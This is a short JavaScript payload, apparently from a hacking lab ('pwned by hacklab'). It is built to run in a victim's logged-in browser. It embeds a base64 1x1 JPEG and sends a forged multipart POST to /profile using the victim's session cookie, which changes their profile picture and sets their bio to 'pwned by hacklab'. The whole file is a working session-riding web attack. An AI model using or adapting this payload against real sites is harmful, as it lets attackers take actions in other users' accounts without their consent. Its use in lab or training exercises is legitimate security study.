// Runs in the victim's (Pepe's) browser, authenticated with Pepe's session cookie.
// Forges a multipart/form-data POST to /profile that changes Pepe's profile picture,
// using a tiny embedded 1x1 red JPEG (base64) so nothing else needs to be hosted.

(async () => {
    // 1x1 red pixel JPEG, base64-encoded
    const b64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=";
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const imgBlob = new Blob([bytes], { type: "image/jpeg" });

    const fd = new FormData();
    fd.append("bio", "pwned by hacklab");
    fd.append("profile_pic", imgBlob, "pwned.jpg");

    await fetch("/profile", {
        method: "POST",
        credentials: "include", // same-origin fetch already sends the session cookie
        body: fd
    });
})();
